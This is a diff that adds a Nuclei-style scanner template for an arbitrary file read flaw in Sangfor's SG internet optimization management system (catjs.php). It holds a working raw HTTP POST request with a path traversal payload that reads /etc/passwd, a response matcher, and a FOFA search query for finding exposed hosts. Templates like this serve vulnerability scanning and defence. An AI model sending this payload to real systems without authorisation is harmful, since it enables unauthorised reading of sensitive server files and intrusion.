@@ -1,0 +1,34 @@
+id: sangfor-sg-catjs-fileread
+
+info:
+  name: 深信服 SG 上网优化管理系统 catjs.php 任意文件读取
+  author: zan8in
+  severity: high
+  description: |
+    深信服 SG 上网优化管理系统 catjs.php 接口存在任意文件读取，未授权可获取服务器敏感文件。
+  reference:
+    - https://mp.weixin.qq.com/s/t5DF-O5uW1Fgnc9kkAlPiQ
+  metadata:
+    max-request: 1
+    fofa-query: title="SANGFOR上网优化管理"
+  tags: sangfor,lfi,fileread
+
+http:
+  - raw:
+      - |
+        POST /php/catjs.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        ["../../../../../../etc/passwd"]
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '// FILE: ../../../../../../etc/passwd'
+
+      - type: status
+        status:
+          - 200
